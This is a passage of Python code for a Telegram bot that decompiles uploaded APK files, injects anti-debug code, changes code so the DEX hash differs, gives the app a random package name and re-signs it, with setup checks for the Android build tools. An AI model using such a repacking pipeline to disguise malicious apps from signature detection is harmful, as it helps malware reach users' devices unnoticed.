            f"{error.details or 'Check SIGN_V1_ENABLED, SIGN_V2_ENABLED, SIGN_V3_ENABLED and SIGN_MIN_SDK_VERSION.'}"
        )
    return f"Error at stage '{error.stage}'.\n\n{error.details or 'No details.'}"


@dp.message(F.document)
async def handle_apk(message: types.Message):
    file_name = message.document.file_name or ""
    if not file_name.lower().endswith(".apk"):
        return await message.answer("Send an .apk file.")

    await message.answer(
        "Starting reverse, hardening injection and rebuild. Please wait..."
    )

    file_id = message.document.file_id
    input_name = os.path.basename(file_name) or "input.apk"
    paths = create_build_paths(input_name)

    try:
        file = await message.bot.get_file(file_id)
        await message.bot.download_file(file.file_path, paths.input_file)

        new_pkg = choose_random_package()
        result_path = await asyncio.to_thread(patch_apk, paths, new_pkg)
        result_sha256 = await asyncio.to_thread(calculate_sha256, result_path)
        await message.answer_document(
            FSInputFile(result_path, filename=input_name),
            caption=(
                f"SHA-256: {result_sha256}\n"
                "Done.\n\n"
                "Injected anti-debug hardening\n"
                "Mutated code paths (DEX hash changed)\n"
                f"New package name: {new_pkg}"
            ),
        )
    except KeystoreConfigError as exc:
        await message.answer(f"Keystore error:\n\n{exc}")
    except StageError as exc:
        await message.answer(build_stage_message(exc))
    except Exception as exc:
        await message.answer(f"Unexpected error: {exc}")
    finally:
        shutil.rmtree(paths.request_dir, ignore_errors=True)


async def main():
    errors = []

    if not API_TOKEN:
        errors.append(
            "[TOKEN]   BOT_TOKEN is not set.\n"
            "          -> Windows:   set BOT_TOKEN=your_token\n"
            "          -> Linux/Mac: export BOT_TOKEN=your_token"
        )

    checks = [
        (
            SIGNER_PATH,
            "Download uber-apk-signer:\n"
            "          -> https://github.com/patrickfav/uber-apk-signer/releases\n"
            "          -> Put the .jar next to main.py or set SIGNER_PATH",
        ),
        (
            KS_PATH,
            "Create a keystore or point KS_PATH to an existing one:\n"
            "          -> keytool -genkey -v -keystore my-release-key.jks "
            "-alias my-alias -keyalg RSA -sigalg SHA256withRSA -keysize 2048 -validity 10000 "
            "-storepass 12345678 -keypass 12345678",
        ),
    ]
    for fpath, hint in checks:
        if not os.path.exists(fpath):
            errors.append(f"[FILE]    '{fpath}' was not found.\n          {hint}")

    tools = [
        ("java", "Install JDK/JRE and add it to PATH."),
        (
            "apktool",
            "Install apktool:\n"
            "          -> https://apktool.org/docs/install\n"
            "          -> Make sure 'apktool' is available from the command line.",
        ),
        (
            ZIPALIGN_PATH,
            "Install zipalign and add it to PATH, or set ZIPALIGN_PATH.",
        ),
    ]
    for tool, hint in tools:
        if not shutil.which(tool) and not os.path.exists(tool):
            errors.append(f"[PATH]    '{tool}' was not found.\n          {hint}")

    if not errors:
        try:
            validate_keystore()
        except KeystoreConfigError as exc:
            errors.append(
                "[KEYSTORE] Invalid signing configuration.\n"
                f"          {exc}\n"
                "          -> Check KS_PATH, KS_ALIAS, KS_PASS, KS_KEY_PASS, KS_TYPE and KS_PASS_ENCODING."
            )

    if errors:
        print("=" * 60)
        print("  Startup check: problems detected")
        print("=" * 60)
        for index, err in enumerate(errors, 1):
            print(f"\n  {index}. {err}")
        print("\n" + "=" * 60)
        print("  Fix the issues above and restart the script.")
        print("=" * 60)
        return

    bot = Bot(token=API_TOKEN)
    print("Bot is running!")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
